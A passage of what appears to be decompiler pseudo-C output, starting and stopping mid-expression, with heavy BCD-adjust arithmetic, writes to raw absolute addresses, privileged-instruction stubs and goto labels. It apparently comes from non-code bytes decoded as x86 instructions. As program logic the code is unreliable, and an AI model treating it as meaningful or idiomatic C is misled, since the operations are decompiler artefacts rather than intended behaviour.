*pcVar18 + uVar6;\n                            puVar36[0x59] = puVar36[0x59] + pcVar45;\n                            *(piVar41 + 0x37) = *(piVar41 + 0x37) ^ pcVar18;\n                            *pcVar18 = *pcVar18 + uVar6;\n                            puVar36[3] = puVar36[3] + uVar6;\n                            cVar33 = (uVar122 >> 8) - *0x39137352;\n                            *(iVar75 + -1) = pcVar45;\n                            uVar118 = *(iVar75 + -1) ^ *0x45252c2d;\n                            pcVar48[pcVar45 * 2 + 0x43] = pcVar48[pcVar45 * 2 + 0x43] + pcVar45;\n                            *(pcVar48 + 0x56) = *(pcVar48 + 0x56) ^ pcVar45;\n                            uVar132 = 9 < (uVar6 & 0xf) | uVar132;\n                            uVar11 = CONCAT11(((pcVar15 & 0xffffff00) >> 8) + uVar132, uVar6 + uVar132 * '\\x06') &\n                                     0xff0f;\n                            *0x51535a51 = *0x51535a51 ^ uVar27 + 3;\n                            cVar49 = uVar11;\n                            *pcVar48 = *pcVar48 + cVar49;\n                            pcVar18 = *(iVar75 + 4);\n                            uVar6 = cVar49 - 0x31;\n                            iVar115 = -*(pcVar48 + 8);\n                            uVar132 = 9 < (uVar6 & 0xf) | uVar132;\n                            uVar122 = (pcVar15 & 0xffff0000 |\n                                      CONCAT11((uVar11 >> 8) - uVar132, uVar6 + uVar132 * -6) & 0xff0f) + 0xdbddcba3;\n                            pcVar15 = uVar122 & 0x382f6275;\n                            *(iVar75 + 3 + iVar115) = uVar118 + 2;\n                            uVar7 = pcVar15;\n                            *pcVar15 = *pcVar15 + uVar7;\n                            *(uVar118 + 0x37) = *(uVar118 + 0x37) + uVar8;\n                            *(iVar75 + iVar115 + -1) = pcVar15;\n                            uVar6 = pcVar15[0x33];\n                            puVar16 = puVar19 & 0xffff0000 | CONCAT11(cVar33, uVar8) & 0xffffff00 | uVar8 ^ uVar6;\n                            piVar123 = pcVar48 + -2;\n                            *(iVar75 + iVar115 + -5) = iVar23 + 1;\n                            *(pcVar18 + 0x4c) = *(pcVar18 + 0x4c) ^ puVar16;\n                            *piVar123 = *piVar123 ^ uVar8 ^ uVar6;\n                            *pcVar15 = *pcVar15 + uVar7;\n                            *pcVar18 = *pcVar18 + uVar7;\n                            iVar37 = *piVar123;\n                            uVar132 = 9 < (uVar7 & 0xf) | uVar132;\n                            uVar122 = (uVar122 & 0x382f0000 |\n                                      CONCAT11((pcVar15 >> 8) - uVar132, uVar7 + uVar132 * -6) & 0xff0f) + 1;\n                            uVar122 = uVar122 & 0xffffff00 | uVar122 - 0x35;\n                            *(iVar75 + iVar115 + iVar37 + -7) = iVar75 + iVar115 + -5 + iVar37;\n                            pcVar15 = uVar122 ^ 0x3e4421;\n                            *pcVar15 = *pcVar15 + pcVar15;\n                            *(iVar75 + iVar115 + iVar37 + -0xb) = uVar118 + 4;\n                            *(iVar75 + iVar115 + iVar37 + -0xf) = uVar118 + 4;\n                            pcVar15 = uVar122 ^ 0x4e7c715e;\n                            uVar38 = *(iVar75 + iVar115 + iVar37 + -0x10);\n                            *pcVar15 = *pcVar15 + pcVar15;\n                            *pcVar15 = *pcVar15 + uVar38;\n                            pcVar15 = uVar122 ^ 0x6a45560e;\n                            uVar6 = pcVar15;\n                            *puVar16 = *puVar16 ^ uVar6;\n                            *pcVar15 = *pcVar15 + uVar6;\n                            pcVar48[0x4e] = pcVar48[0x4e] + uVar6;\n                            uVar38 = uVar38 ^ *(uVar38 + 0x4b);\n                            uVar17 = iVar23 + 1;\n                            *pcVar15 = *pcVar15 + uVar6;\n                            *piVar123 = *piVar123 + uVar38;\n                            *(uVar27 + 0x3b) = *(uVar27 + 0x3b) - puVar16;\n                            pcVar48[0x43] = pcVar48[0x43] + (uVar6 & 0x42);\n                            *(uVar38 + 0x39) = *(uVar38 + 0x39) ^ piVar123;\n                            pcVar15 = *(iVar75 + iVar115 + iVar37 + -0xb);\n                            uVar118 = uVar118 + 4;\n                            *(iVar75 + iVar115 + iVar37 + -0xb) = uVar38;\n                            uVar6 = pcVar15;\n                            *pcVar15 = *pcVar15 + uVar6;\n                            *pcVar15 = *pcVar15 + uVar6;\n                            uVar132 = 9 < (uVar6 & 0xf) | uVar132;\n                            uVar11 = CONCAT11((pcVar15 >> 8) - uVar132, uVar6 + uVar132 * -6) & 0xff0f;\n                            puVar36 = ((uVar27 + 4) - *(uVar38 + piVar123 * 2)) - uVar132;\n                            *(iVar75 + iVar115 + iVar37 + -0xe) = uVar118;\n                            iVar31 = *(iVar75 + iVar115 + iVar37 + -0xe);\n                            uVar122 = *(iVar75 + iVar115 + iVar37 + -10);\n                            *(iVar75 + iVar115 + iVar37 + -10) = uVar17;\n                            *(iVar75 + iVar115 + iVar37 + -0xe) = uVar17;\n                            uVar6 = uVar11;\n                            uVar132 = 9 < uVar6 | uVar132;\n                            uVar11 = CONCAT11((uVar11 >> 8) + uVar132, uVar6 + uVar132 * '\\x06') & 0xff0f;\n                            pcVar15 = pcVar15 & 0xffff0000 | uVar11;\n                            *(iVar75 + iVar115 + iVar37 + -0x12) = pcVar15;\n                            cVar49 = uVar11;\n                            *pcVar15 = *pcVar15 + cVar49;\n                            *pcVar15 = *pcVar15 + cVar49;\n                            *(iVar75 + iVar115 + iVar37 + -0x16) = iVar75 + iVar115 + iVar37 + -0x12;\n                            puVar16 = pcVar15 + -0x3e052233 & 0xffffff00;\n                            *0x4b564142 = *0x4b564142 + (uVar122 >> 8);\n                            pcVar18 = pcVar48 + -3;\n                            puVar26 = iVar31 + -1;\n                            puVar76 = iVar75 + iVar115 + iVar37 + -0x1a;\n                            *(iVar75 + iVar115 + iVar37 + -0x1a) = puVar36;\n                            uVar6 = *puVar16;\n                            *puVar16 = *puVar16;\n                            if (*puVar16 == 0 || SCARRY1(uVar6, '\\0') != *puVar16 < '\\0') {\n                                puVar26 = uVar122 + uVar118 * 2;\n                                *puVar26 = *puVar26 & uVar17;\n                                iVar31 = *(iVar75 + iVar115 + iVar37 + -0x1a);\n                                *(iVar75 + iVar115 + iVar37 + -0x1a) = pcVar18;\n                                puVar16 = ((pcVar15 + -0x3e052233 & 0xffff0000 |\n                                           CONCAT11((puVar16 >> 8) + uVar132, uVar132 * '\\x06') & 0xff0f) ^ 0x38) - 1;\n                                uVar7 = puVar16;\n                                *puVar16 = *puVar16 + uVar7;\n                                uVar6 = *puVar16;\n                                *puVar16 = *puVar16 + uVar7;\n                                *puVar16 = (*puVar16 - (pcVar18 >> 8)) - CARRY1(uVar6, uVar7);\n                                *(iVar75 + iVar115 + iVar37 + -0x1a) = iVar31;\n                                *puVar16 = *puVar16 + uVar7;\n                                pcVar48[0x54] = pcVar48[0x54] + iVar31;\n                                uVar38 = iVar31 - 1;\n                                *(iVar75 + iVar115 + iVar37 + -0x1e) = puVar36;\n                                *(iVar75 + iVar115 + iVar37 + -0x22) = uVar17;\n                                *puVar16 = *puVar16 + uVar7;\n                                uVar6 = *puVar16;\n                                *puVar16 = *puVar16 + uVar7;\n                                uVar118 = *(iVar75 + iVar115 + iVar37 + -0x22);\n                                puVar76 = iVar75 + iVar115 + iVar37 + -0x22;\n                                *(iVar75 + iVar115 + iVar37 + -0x22) = uVar38;\n                                puVar26 = uVar38 & 0xffff0000 | CONCAT11(uVar38 >> 8 | *puVar36, uVar38);\n                                puVar124 = (puVar16 & 0xffffff00 | uVar7 + 100 + CARRY1(uVar6, uVar7)) ^ 0x36383f2e;\n                                uVar39 = LocalDescriptorTableRegister();\n                                *puVar124 = uVar39;\n                                *puVar124 = *puVar124 + puVar124;\n                                pcVar15 = puVar124 + -1;\n                                uVar132 = 9 < (pcVar15 & 0xf) | uVar132;\n                                puVar16 = pcVar15 & 0xffff0000 |\n                                          CONCAT11((pcVar15 >> 8) + uVar132, pcVar15 + uVar132 * '\\x06') & 0xff0f;\n                                puVar16[0x49] = puVar16[0x49] ^ pcVar18;\n                                puVar36 = puVar36 + 1;\n                            }\n                            ppuVar113 = pcVar48 + -5;\n                            *(puVar76 + -4) = uVar118;\n                            puVar77 = puVar76 + -8;\n                            *(puVar76 + -8) = ppuVar113;\n                            uVar7 = puVar16;\n                            *puVar16 = *puVar16 + uVar7;\n                            uVar6 = *puVar16;\n                            *puVar16 = *puVar16 + uVar7;\n                            *ppuVar113 = puVar16 + *ppuVar113 + CARRY1(uVar6, uVar7);\n                            puVar36 = puVar36 + 3;\n                            *0x2346361e = *0x2346361e & uVar122;\n                            uVar38 = puVar16 & 0xffffff5a;\n                            *puVar26 = *puVar26 & uVar122;\n                            iVar37 = iVar23 + 2;\n                            if (-1 < *puVar26) {\n                                *ppuVar113 = *ppuVar113 & ppuVar113 >> 8;\n                                uVar6 = uVar38 ^ 3;\n                                uVar132 = 9 < uVar6 | uVar132;\n                                *(puVar76 + -0xc) = uVar122;\n                                *(puVar76 + -0x10) = puVar26;\n                                puVar36 = puVar36 ^ *(uVar122 + 1);\n                                *(puVar76 + -0x14) = puVar36;\n                                uVar122 = *(puVar76 + -0x14);\n                                *(puVar76 + -0x14) = uVar122 ^ 0x4835535a;\n                                uVar122 = uVar122 ^ 0x11011e0b;\n                                *(puVar76 + -0x18) = puVar36;\n                                *(puVar76 + -0x1c) = iVar23 + 1;\n                                *(puVar76 + -0x20) = puVar36;\n                                *(uVar122 + 0x54) = *(uVar122 + 0x54) ^ puVar26;\n                                *(puVar76 + -0x24) = puVar76 + -0x20;\n                                uVar118 = uVar118 + 1;\n                                *(puVar76 + -0x28) = puVar36;\n                                puVar77 = puVar76 + -0x2c;\n                                *(puVar76 + -0x2c) = uVar118;\n                                ppuVar113 = pcVar48 + -6;\n                                uVar132 = 9 < (uVar122 & 0xf) | 9 < (uVar6 + uVar132 * '\\x06' + 0xad & 0xf) | uVar132;\n                                uVar38 = uVar122 & 0xffff0000 |\n                                         CONCAT11((uVar122 >> 8) + uVar132, uVar122 + uVar132 * '\\x06') & 0xff0f;\n                                iVar37 = iVar23;\n                            }\n                            uVar39 = *puVar77;\n                            pcVar18 = ppuVar113 + -1;\n                            uVar38 = uVar38 ^ 0x354f;\n                            *pcVar18 = *pcVar18 + uVar39;\n                            *puVar77 = uVar38;\n                            puVar77[-1] = puVar26;\n                            puVar77[-2] = uVar39;\n                            puVar77[-3] = pcVar18;\n                            puVar77[-4] = puVar77 + 1;\n                            puVar77[-5] = iVar37;\n                            puVar77[-6] = puVar36;\n                            puVar19 = puVar77 + -7;\n                            puVar77[-7] = uVar118;\n                            uVar132 = 9 < (uVar38 & 0xf) | uVar132;\n                            pcVar15 = (uVar38 & 0xffffff00 | uVar38 + uVar132 * -6) & 0x3b260006;\n                            uVar6 = pcVar15;\n                            if (uVar6 < 0x4e) {\n                                uVar7 = 9 < uVar6 | uVar132;\n                                uVar38 = (uVar38 >> 8 & 0x3b2600) << 8;\n                                uVar11 = CONCAT11(-uVar7, uVar6 + uVar7 * -6) & 0xff0f;\n                                puVar36 = puVar77[-7];\n                                uVar132 = 9 < uVar11 | uVar7;\n                                uVar6 = uVar11 + uVar132 * '\\x06';\n                                uVar6 = uVar6 + (0x90 < (uVar6 & 0xf0) | uVar7 | uVar132 * (0xf9 < uVar6)) * '`';\n                                puVar28 = uVar38 | uVar11 & 0xffffff00 | uVar6;\n                                uVar118 = uVar118 & *puVar28;\n                                puVar19 = uVar118 + 0x36;\n                                uVar122 = *puVar19;\n                                *puVar19 = *puVar19 - uVar118;\n                                puVar77[-7] = uVar39;\n                                uVar6 = uVar6 + *puVar28 + (uVar122 < uVar118);\n                                pcVar15 = uVar38 | uVar11 & 0xffffff00 | uVar6;\n                                *pcVar15 = *pcVar15 + uVar6;\n                                *(uVar118 + 0x33) = *(uVar118 + 0x33) + puVar26;\n                                puVar26 = puVar77[-7] + -1;\n                                puVar19 = puVar77 + -6;\n                            }\n                            else {\n                                pcVar18 = pcVar18 ^ *(puVar26 + 0x49);\n                            }\n                            *(puVar19 + -4) = puVar26;\n                            *(puVar19 + -4) = pcVar18;\n                            *(puVar19 + -8) = puVar19 + -4;\n                            uVar132 = 9 < (pcVar15 & 0xf) | uVar132;\n                            *(puVar19 + -0xc) = pcVar18;\n                            *(puVar19 + -0x10) = puVar19 + -0xc;\n                            uVar122 = *(puVar19 + -0x10);\n                            *(puVar19 + -0x10) = iVar37;\n                            puVar46 = (pcVar15 & 0xffff0000 |\n                                      CONCAT11((pcVar15 >> 8) + uVar132, pcVar15 + uVar132 * '\\x06') & 0xff0f) ^\n                                      0x39484c53;\n                            *(uVar122 + 0x36) = *(uVar122 + 0x36) ^ pcVar18;\n                            uVar7 = puVar46;\n                            *puVar46 = *puVar46 + uVar7;\n                            uVar6 = *puVar46;\n                            *puVar46 = *puVar46 + uVar7;\n                            uVar130 = *(puVar19 + -0x10);\n                            puVar16 = puVar46 + 0x2d3a2736;\n                            puVar46 = uVar122 & 0xffffff00 |\n                                      uVar122 + puVar16[CARRY1(uVar6, uVar7)] +\n                                      (0xd2c5d8c9 < puVar46 || CARRY4(puVar16, CARRY1(uVar6, uVar7)));\n                            puVar47 = pcVar18 & 0xffff0000 | CONCAT11(pcVar18 >> 8 ^ *puVar46, pcVar18);\n                            puVar16 = puVar16 + CARRY1(uVar6, uVar7) + -0x805245d;\n                            *(puVar19 + -0x10) = uVar118 - 1;\n                            uVar6 = (puVar16 - *(in_FS_OFFSET + iVar37 + 0x46 + (uVar118 - 1))) -\n                                    (puVar36[-1] < (uVar122 & 0xffffff00) >> 8);\n                            uVar132 = 9 < (uVar6 & 0xf) | uVar132;\n                            uVar11 = CONCAT11((puVar16 >> 8) + uVar132, uVar6 + uVar132 * '\\x06') & 0xff0f;\n                            *(puVar19 + -0x14) = puVar19 + -0x10;\n                            uVar6 = 9 < uVar11 | uVar132;\n                            uVar7 = uVar11 + uVar6 * -6;\n                            uVar7 = uVar7 + (0x9f < uVar7 | uVar132 | uVar6 * (uVar7 < 6)) * -0x60;\n                            pcVar15 = puVar16 & 0xffff0000 | uVar11 & 0xffffff00 | uVar7;\n                            *pcVar15 = *pcVar15 + uVar7;\n                            *(puVar19 + -0x18) = puVar19 + -0x14;\n                            puVar40 = puVar47 + 2;\n                            *(puVar19 + -0x1c) = puVar40;\n                            *(puVar19 + -0x20) = puVar46;\n                            *(puVar19 + -0x24) = puVar19 + -0x20;\n                            *(puVar19 + -0x28) = iVar37;\n                            iVar23 = *(puVar19 + -0x28);\n                            uVar27 = *(puVar19 + -0x24);\n                            *(uVar27 + 0x34) = *(uVar27 + 0x34) ^ uVar27;\n                            *(puVar19 + -0x23) = puVar36 + -1;\n                            uVar122 = iVar23 - 1U ^ *(uVar27 + 0x58);\n                            *pcVar15 = *pcVar15 + uVar7;\n                            puVar36[0x61] = puVar36[0x61] + (uVar122 >> 8);\n                            puVar46 = *(puVar19 + -0x23);\n                            iVar23 = *(puVar19 + -0x1f);\n                            uVar38 = (puVar16 & 0xffff0000 | uVar11 & 0xffffff00 | uVar7 & 0xffffff24) -\n                                     *(puVar46 + 0x36);\n                            *puVar40 = *puVar40 ^ uVar38 >> 8;\n                            puVar16 = uVar38 & 0xffffff23;\n                            *puVar16 = *puVar16 + puVar16;\n                            uVar122 = *(uVar122 + 0x47);\n                            uVar118 = iVar23 + 1;\n                            *(puVar16 + 0x33) = *(puVar16 + 0x33) ^ puVar40;\n                            uVar17 = *(puVar19 + -0x1b);\n                            uVar122 = (uVar27 ^ uVar122) + 2;\n                            *puVar16 = *puVar16 + puVar16;\n                            uVar132 = *puVar16;\n                            *(puVar19 + -0x1b) = uVar118;\n                            uVar38 = uVar38 & 0xffffff02;\n                            *0x2e = *0x2e - (uVar38 >> 8);\n                            *(puVar19 + -0x1f) = uVar122;\n                            pcVar15 = uVar38 ^ 0x5a;\n                            *(puVar19 + -0x22) = puVar46;\n                            puVar26 = iVar23 + 0x56;\n                            *puVar26 = *puVar26 ^ uVar122;\n                            puVar28 = (uVar17 & 0xffff0000 | CONCAT11(uVar17 >> 8 & uVar132, uVar17)) + 1;\n                            *(puVar19 + -0x26) = puVar28;\n                            puVar26 = puVar47 + 1;\n                            uVar132 = pcVar15;\n                            *pcVar15 = *pcVar15 + uVar132;\n                            *0x22213d56 = *0x22213d56 + (puVar28 >> 8);\n                            puVar36[0x31] = puVar36[0x31] ^ uVar132;\n                            *(puVar47 + 0x27) = *(puVar47 + 0x27) ^ puVar46;\n                            puVar120 = puVar36 + 1;\n                            uVar78 = puVar19 + -0x26 ^ *puVar28;\n                            *(uVar78 - 4) = uVar122 & 0xffff0000 | CONCAT11((uVar122 >> 8) - *puVar26, uVar122);\n                            *pcVar15 = *pcVar15 + uVar132;\n                            uVar39 = *(uVar78 - 4);\n                            iVar22 = uVar39;\n                            uVar38 = uVar38 ^ 0x4841451f;\n                            *(uVar78 - 4) = uVar118;\n                            *(uVar78 - 8) = uVar118;\n                            uVar6 = 9 < (uVar38 & 0xf) | uVar6;\n                            uVar11 = CONCAT11((uVar38 >> 8) + uVar6, uVar38 + uVar6 * '\\x06') & 0xff0f;\n                            puVar19 = *(uVar78 - 8);\n                            piVar79 = uVar78 - 8;\n                            *(uVar78 - 8) = uVar118;\n                            uVar132 = uVar11;\n                            uVar6 = 9 < uVar132 | uVar6;\n                            uVar11 = CONCAT11((uVar11 >> 8) + uVar6, uVar132 + uVar6 * '\\x06') & 0xff0f;\n                            pcVar15 = uVar38 & 0xffff0000 | uVar11;\n                            *pcVar15 = *pcVar15 + uVar11;\n                            uVar122 = pcVar15 & 0x3e262b28;\n                            *puVar19 = *puVar19 & puVar120;\n                            if ((POPCOUNT(*puVar19 & 0xff) & 1U) == 0) {\ncode_r0x004422f4:\n                                *puVar47 = *puVar47 & uVar122 >> 8;\n                                piVar123 = uVar122 ^ 0x171b0178;\n                                puVar26 = puVar47;\n                                if (piVar123 < 0) goto code_r0x004422fd;\n                            }\n                            else {\n                                pcVar15 = uVar122 ^ 0x36;\n                                *puVar120 = *puVar120 - (uVar39 >> 8);\n                                *pcVar15 = *pcVar15 + pcVar15;\n                                puVar120 = puVar36 + 2;\n                                puVar46 = puVar46 + 1;\n                                *(uVar78 - 0xb) = puVar46;\n                                *(uVar78 - 0xe) = uVar78 - 10;\n                                pcVar15 = pcVar15 + -1;\n                                iVar22 = iVar22 + 2;\n                                puVar19 = *(uVar78 - 10);\n                                *pcVar15 = *pcVar15 + pcVar15;\n                                if (-1 < *pcVar15) {\n                                    *puVar46 = *puVar46 & puVar19 >> 8;\n                                    iVar22 = *(uVar78 - 6);\n                                    *0x53463000 = *0x53463000 & *(uVar78 - 6) >> 8;\n                                    puVar47 = puVar47 + 2;\n                                    piVar79 = uVar78 - 6;\n                                    *(uVar78 - 6) = puVar19;\n                                    *(uVar78 - 10) = uVar78 - 6;\n                                    uVar132 = *puVar47;\n                                    *puVar47 = *puVar47 + puVar47;\n                                    piVar123 = puVar120 * 2 + 0x27756513;\n                                    *piVar123 = puVar19 + CARRY1(uVar132, puVar47) + *piVar123;\n                                    puVar16 = pcVar15 & 0xffffff26;\n                                    uVar118 = uVar118 - *puVar19;\n                                    *puVar16 = *puVar16 & puVar47 >> 8;\n                                    puVar19 = *(uVar78 - 10);\n                                    uVar6 = 9 < (puVar16 & 0xf) | uVar6;\n                                    uVar132 = puVar16 + uVar6 * -6;\n                                    puVar124 = segment(uVar128, puVar46);\n                                    puVar46 = puVar46 & 0xffff0000 | puVar46 + 4;\n                                    uVar39 = in(puVar19);\n                                    *puVar124 = uVar39;\n                                    uVar122 = pcVar15 & 0xffffff00 |\n                                              (uVar132 + (0x9f < uVar132 | uVar6 * (uVar132 < 6)) * -0x60) - 0x23;\n                                    goto code_r0x004422f4;\n                                }\n                                puVar120 = *(uVar78 - 6);\n                                piVar79 = uVar78 - 2;\n                                *puVar26 = *puVar26 & uVar118;\n                                *puVar120 = *puVar120 & uVar78 - 2;\n                                piVar123 = pcVar15 ^ 0x4c302a;\ncode_r0x004422fd:\n                                *(puVar120 + 0x21) = *(puVar120 + 0x21) + puVar26 + (iVar22 >> 8 < *puVar120);\n                                puVar46 = puVar46 + -*piVar123;\n                                pcVar15 = piVar123 ^ 0x4c302a;\n                                *pcVar15 = *pcVar15 + pcVar15;\n                                pcVar15[0x54] = pcVar15[0x54] + iVar22;\n                                piVar123 = *(piVar79 + -1);\n                                piVar79 = piVar79 + 3;\n                                *(piVar123 + 0x31) = *(piVar123 + 0x31) ^ puVar19;\n                            }\n                            piVar79[-1] = uVar118;\n                            puVar36 = puVar120 + -1;\n                            puVar16 = puVar120 + -2;\n                            iVar23 = piVar79[-1];\n                            uVar6 = 9 < (piVar123 & 0xf) | uVar6;\n                            *(piVar79 + -1) = puVar16;\n                            *(piVar79 + -5) =\n                                 piVar123 & 0xffff0000 |\n                                 CONCAT11((piVar123 >> 8) + uVar6, piVar123 + uVar6 * '\\x06') & 0xff0f;\n                            uVar122 = *(piVar79 + -1);\n                            *(piVar79 + -1) = puVar46 + 2;\n                            puVar46 = puVar46 + 1;\n                            *(piVar79 + -5) = uVar118 - 2;\n                            *(piVar79 + -9) = uVar122 ^ 0x39;\n                            pcVar15 = (uVar122 ^ 0x39) - 1;\n                            puVar80 = piVar79 + -0xd;\n                            *(piVar79 + -0xd) = uVar118 - 2;\n                            uVar132 = *puVar16;\n                            uVar8 = *piVar79 + 2U;\n                            uVar7 = uVar8 + *puVar16;\n                            uVar122 = *piVar79 + 2U & 0xffffff00;\n                            puVar19 = uVar122 | uVar7;\n                            uVar10 = uVar122 >> 8;\n                            if (SCARRY1(uVar8, *puVar16) != uVar7 < '\\0') {\n                                uVar122 = *puVar19;\n                                puVar46 = *(puVar16 + piVar79 + -0xd) * 0x17136c3b;\n                                *(uVar118 + 0x15) = *(uVar118 + 0x15) + uVar10;\n                                pcVar15 = *(pcVar15 + (-CARRY1(uVar8, uVar132) - uVar122) + 0x58) * 0x33;\n                                puVar80 = piVar79 + -0x11;\n                                *(piVar79 + -0x11) = puVar16;\n                                *puVar19 = *puVar19 & iVar23 + 1 >> 8;\n                            }\n                            *pcVar15 = *pcVar15 + pcVar15;\n                            *(puVar80 + -4) = iVar23 + 1;\n                            *(puVar80 + -8) = puVar26;\n                            puVar26[0x16] = puVar26[0x16] ^ puVar19;\n                            *(puVar80 + -0xc) = puVar16;\n                            puVar28 = iVar23 + -1;\n                            *(puVar80 + -0x10) = puVar46;\n                            *(puVar80 + -0x15) = uVar118 - 1;\n                            puVar47 = puVar46 + -1;\n                            puVar81 = puVar80 + -0x19;\n                            *(puVar80 + -0x19) = puVar80 + -0x15;\n                            pcVar15[puVar36] = pcVar15[puVar36] ^ uVar10;\n                            *puVar28 = *puVar28 | puVar19;\n                            *puVar26 = *puVar26 - uVar7;\n                            uVar122 = (pcVar15 ^ 0x5917) + 0x56246465;\n                            *puVar26 = *puVar26 ^ puVar36;\n                            if (*puVar26 < 1) {\ncode_r0x004423f5:\n                                uVar122 = uVar122 ^ 0x38484430;\n                                *(puVar81 + -4) = puVar28 + -1;\n                                *(puVar81 + -8) = uVar118;\n                                *puVar26 = *puVar26 ^ puVar19 >> 8;\n                                *(puVar81 + -0xc) = uVar118;\n                                uVar6 = 9 < (uVar122 & 0xf) | uVar6;\n                                puVar120 = uVar122 & 0xffff0000 |\n                                           CONCAT11((uVar122 >> 8) + uVar6, uVar122 + uVar6 * '\\x06') & 0xff0f;\n                                puVar16 = puVar26 + -1;\n                                puVar121 = puVar36 + 2;\n                                *(puVar81 + -0x10) = puVar19;\n                                *(puVar81 + -0x14) = puVar28 + -1;\n                                puVar82 = puVar81 + -0x18;\n                                *(puVar81 + -0x18) = puVar120;\n                            }\n                            else {\n                                puVar121 = puVar36 & *(puVar47 * 3);\n                                puVar16 = puVar26 ^ *puVar47;\n                                puVar82 = puVar80 + -0x1d;\n                                *(puVar80 + -0x1d) = uVar118;\n                                piVar123 = iVar23 + -2;\n                                uVar132 = (uVar122 & 0x32) + 0x78;\n                                ppuVar64 = iVar23 + 0x45;\n                                uVar6 = 9 < (uVar132 & 0xf) | uVar6;\n                                uVar132 = uVar132 + uVar6 * -6;\n                                puVar120 = uVar122 & 0xffffff00 |\n                                           uVar132 + (0x9f < uVar132 | *ppuVar64 < puVar19 | uVar6 * (uVar132 < 6)) *\n                                                     -0x60;\n                                if (*ppuVar64 != puVar19 && puVar19 <= *ppuVar64) {\n                                    *puVar19 = *puVar19 & puVar80 + -0x1d;\n                                    *(puVar80 + -0x21) = puVar120;\n                                    *(puVar80 + -0x25) = piVar123;\n                                    *(puVar80 + -0x29) = puVar19;\n                                    *(puVar80 + -0x2d) = puVar16;\n                                    *(puVar80 + -0x31) = puVar80 + -0x1d;\n                                    *(puVar80 + -0x35) = uVar118;\n                                    *(puVar80 + -0x39) = puVar121;\n                                    *(puVar80 + -0x3d) = puVar47;\n                                    *(puVar80 + -0x41) = piVar123;\n                                    iVar37 = -*piVar123;\n                                    *(puVar80 + iVar37 + -0x45) = 0x3c285668;\n                                    *(puVar19 + 0x69) = *(puVar19 + 0x69) ^ iVar23 + -3 >> 8;\n                                    *(puVar80 + iVar37 + -0x49) = puVar19;\n                                    iVar125 = *(puVar80 + iVar37 + -0x49);\n                                    iVar31 = *(puVar80 + iVar37 + -0x45);\n                                    uVar118 = *(puVar80 + iVar37 + -0x41);\n                                    iVar23 = *(puVar80 + iVar37 + -0x39);\n                                    iVar115 = *(puVar80 + iVar37 + -0x35);\n                                    puVar28 = *(puVar80 + iVar37 + -0x31);\n                                    uVar122 = *(puVar80 + iVar37 + -0x2d) | 0x181c1d14;\n                                    uVar132 = uVar122 - 0x39;\n                                    cVar49 = (uVar122 >> 8) - *(iVar31 + 0x2c);\n                                    uVar8 = iVar23;\n                                    uVar6 = 9 < (uVar132 & 0xf) | uVar6;\n                                    uVar7 = uVar132 + uVar6 * '\\x06';\n                                    uVar7 = uVar7 + (0x90 < (uVar7 & 0xf0) |\n                                                    uVar8 < *(iVar125 + 0x2d) | uVar6 * (0xf9 < uVar7)) * '`';\n                                    pcVar15 = uVar122 & 0xffff0000 | CONCAT11(cVar49, uVar132) & 0xffffff00 | uVar7;\n                                    *pcVar15 = *pcVar15 + uVar7;\n                                    *(iVar115 + 0x54) = *(iVar115 + 0x54) + uVar8;\n                                    *(puVar80 + iVar37 + -0x2d) = puVar80 + iVar37 + -0x29;\n                                    *(puVar80 + iVar37 + -0x31) = iVar31;\n                                    *(puVar80 + puVar28 * 2 + iVar37 + 8) =\n                                         *(puVar80 + puVar28 * 2 + iVar37 + 8) ^ pcVar15;\n                                    puVar19 = iVar115 + 1;\n                                    *(puVar80 + iVar37 + -0x35) = puVar19;\n                                    *(puVar80 + iVar37 + -0x39) = pcVar15;\n                                    uVar6 = 9 < (uVar7 & 0xf) | uVar6;\n                                    uVar122 = uVar122 & 0xffff0000 |\n                                              CONCAT11(cVar49 + uVar6, uVar7 + uVar6 * '\\x06') & 0xff0f;\n                                    *(puVar80 + iVar37 + -0x3d) = uVar122;\n                                    puVar26 = iVar23 + 1;\n                                    *(puVar80 + iVar37 + -0x41) = uVar122;\n                                    iVar23 = *(puVar80 + iVar37 + -0x41);\n                                    *puVar26 = *puVar26 ^ iVar115 >> 8;\n                                    puVar47 = iVar125 + 3;\n                                    *(puVar80 + iVar37 + -0x41) = iVar115;\n                                    *(puVar80 + iVar37 + -0x45) = iVar31 + 2U;\n                                    uVar122 = iVar23 - 1;\n                                    *(puVar80 + iVar37 + -0x49) = puVar28;\n                                    puVar36 = iVar31 + 2U ^ *(uVar122 + puVar28 * 2);\n                                    *(puVar80 + iVar37 + -0x4d) = puVar80 + iVar37 + -0x49;\n                                    puVar81 = puVar80 + iVar37 + -0x51;\n                                    *(puVar80 + iVar37 + -0x51) = puVar28;\n                                    goto code_r0x004423f5;\n                                }\n                            }\n                            uVar132 = puVar120;\n                            *(puVar121 + 0x4e) = *(puVar121 + 0x4e) ^ uVar132;\n                            iVar23 = *puVar82;\n                            *puVar120 = *puVar120 ^ uVar132;\n                            *puVar120 = *puVar120 + uVar132;\n                            puVar120[0xb] = puVar120[0xb] + puVar19;\n                            *puVar120 = *puVar120 & puVar47;\n                            uVar6 = 9 < (uVar132 & 0xf) | uVar6;\n                            uVar17 = puVar82[1];\n                            *(puVar47 + 0x35) = *(puVar47 + 0x35) + iVar23;\n                            uVar39 = puVar82[2];\n                            puVar82[2] = puVar121;\n                            puVar82[1] = puVar47;\n                            *puVar82 = uVar17;\n                            *0x3e383538 = *0x3e383538 + uVar39;\n                            uVar17 = uVar17 & *puVar19;\n                            uVar122 = puVar16 & 0xffff0000 |\n                                      CONCAT11((puVar16 >> 8) - *(puVar121 + uVar17 * 2), puVar16);\n                            *(uVar17 + 0x59) = *(uVar17 + 0x59) + puVar19;\n                            uVar38 = uVar122 - 1;\n                            puVar26 = iVar23 + -1;\n                            pcVar15 = *(puVar82 + -1);\n                            puVar83 = puVar82 + 3;\n                            uVar132 = pcVar15;\n                            *pcVar15 = *pcVar15 + uVar132;\n                            if (*pcVar15 < '\\0') {\n                                *puVar47 = *puVar47 + puVar19;\ncode_r0x00442471:\n                                uVar8 = puVar19 ^ *puVar121;\n                                uVar122 = puVar19 & 0xffffff00;\n                                puVar36 = uVar122 | uVar8;\n                                Var2 = pcVar15 >> 8 & 0x265612;\n                                uVar132 = puVar36[in_GS_OFFSET];\n                                *(puVar83 + -4) = uVar17;\n                                uVar7 = (pcVar15 & 0x3b ^ 0x3e | 0x2c) ^ 0x35;\n                                uVar6 = 9 < (uVar7 & 0xf) | uVar6;\n                                uVar7 = uVar7 + uVar6 * '\\x06';\n                                uVar6 = 9 < (uVar7 & 0xf) | uVar6;\n                                uVar27 = (Var2 & 0xffff00) << 8 |\n                                         CONCAT11(Var2 + uVar6, uVar7 + uVar6 * '\\x06') & 0xff0f;\n                                puVar16 = uVar38 & 0xffff0000 | 